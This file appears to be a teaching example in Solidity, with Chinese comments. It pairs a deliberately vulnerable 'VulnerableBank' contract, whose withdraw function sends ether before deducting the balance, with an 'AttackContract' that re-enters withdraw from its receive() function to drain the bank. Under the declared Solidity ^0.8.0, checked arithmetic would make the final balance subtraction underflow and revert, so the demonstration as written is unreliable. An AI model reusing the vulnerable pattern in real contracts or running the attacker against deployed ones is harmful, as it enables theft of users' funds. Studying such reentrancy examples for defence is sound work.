// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract VulnerableBank {
    mapping(address => uint256) public balances;
    
    // 存款函数
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
    
    // 有漏洞的提款函数 - 容易受到重入攻击
    function withdraw(uint256 amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        // 漏洞：在更新余额之前就发送以太币
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        // 余额更新在转账之后 - 这是问题所在
        balances[msg.sender] -= amount;
    }
    
    // 查询余额
    function getBalance(address user) public view returns (uint256) {
        return balances[user];
    }
    
    // 查询合约总余额
    function getContractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

// 攻击合约示例
contract AttackContract {
    VulnerableBank public bank;
    uint256 public attackAmount;
    
    constructor(address bankAddress) {
        bank = VulnerableBank(bankAddress);
        attackAmount = 1 ether;
    }
    
    // 开始攻击
    function attack() public payable {
        require(msg.value >= attackAmount, "Need at least 1 ether");
        bank.deposit{value: attackAmount}();
        bank.withdraw(attackAmount);
    }
    
    // 重入攻击的关键：fallback函数
    receive() external payable {
        if (address(bank).balance >= attackAmount) {
            bank.withdraw(attackAmount);
        }
    }
    
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}